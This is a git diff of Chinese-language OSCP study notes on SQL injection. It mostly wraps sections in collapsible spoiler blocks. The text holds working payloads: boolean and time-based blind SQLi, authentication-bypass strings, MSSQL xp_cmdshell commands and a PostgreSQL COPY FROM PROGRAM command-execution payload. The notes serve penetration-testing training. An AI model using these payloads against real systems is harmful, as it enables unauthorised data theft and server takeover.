@@ -63,7 +63,10 @@ date: 2024-02-07
 
 #### SQLi
 
-##### SQL 基本操作
+##### SQL 連線
+
+<details markdown="1">
+<summary><span class="spoiler">CMD</span></summary>
 
 - MySQL
   ```bash
@@ -76,9 +79,6 @@ date: 2024-02-07
   SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec'; # 查密碼
   ```
 - MSSQL
-
-  <details markdown="1">
-  <summary><span class="spoiler">CMD</span></summary>
 
   ```bash
   $ impacket-mssqlclient <username>:<password>@<MSSQL IP> -windows-auth # 連線
@@ -99,7 +99,7 @@ date: 2024-02-07
   EXEC xp_cmdshell 'whoami';
   ```
 
-  </details>
+</details>
 
 ##### SQLi
 
@@ -175,6 +175,9 @@ date: 2024-02-07
   </details>
 
 - Boolean-Based
+  <details markdown="1">
+  <summary><span class="spoiler">Example</span></summary>
+
   ```sql
   ' AND 1=1-- -                          -- 真，頁面正常
   ' AND 1=2-- -                          -- 假，頁面不同
@@ -184,7 +187,13 @@ date: 2024-02-07
   ' AND ASCII(SUBSTRING(database(),1,1))>100-- -    -- 用二分法加速
   ' AND ASCII(SUBSTRING(database(),1,1))<120-- -
   ```
+
+  </details>
+
 - Time-Based
+  <details markdown="1">
+  <summary><span class="spoiler">Example</span></summary>
+
   ```sql
   ' AND SLEEP(5)-- -                     -- 確認能注入
   ' AND IF(1=1, SLEEP(5), 0)-- -
@@ -192,7 +201,13 @@ date: 2024-02-07
   ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100, SLEEP(5), 0)-- -
   ' AND (SELECT 8220 FROM (SELECT(SLEEP(5)))uvWb)-- -
   ```
+
+  </details>
+
 - 認證繞過
+  <details markdown="1">
+  <summary><span class="spoiler">Example</span></summary>
+
   ```sql
   ' OR 1=1-- -
   ' OR '1'='1
@@ -200,7 +215,12 @@ date: 2024-02-07
   ' OR 1=1 LIMIT 1-- -
   ' OR 1=1#
   ```
+
+  </details>
+
 - MSSQL 專用（OSCP 常見）
+  <details markdown="1">
+  <summary><span class="spoiler">Example</span></summary>
 
   ```sql
   ' UNION SELECT 1,2,3-- -
@@ -213,12 +233,22 @@ date: 2024-02-07
   '; WAITFOR DELAY '0:0:5'--
   ```
 
+  </details>
+
 - PostgreSQL
+  <details markdown="1">
+  <summary><span class="spoiler">Example</span></summary>
+
   ```sql
   ' UNION SELECT NULL,NULL,NULL-- -      -- 用 NULL 避免型別問題
   '; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'id';-- -
   ```
+
+  </details>
+
 - 各資料庫 RCE Payload
+  <details markdown="1">
+  <summary><span class="spoiler">Example</span></summary>
   - MSSQL(`xp_cmdshell`): 條件： 需要 sa 或 sysadmin 角色
 
     ```sql
@@ -268,6 +298,8 @@ date: 2024-02-07
     };
     ```
   - SQLite: 本身沒有內建 RCE 能力。唯一的方式是 load_extension()，但幾乎所有環境都預設禁用。主要用於讀資料。
+
+  </details>
 
 - 判斷使用哪個 Database
   - 從端口推斷：
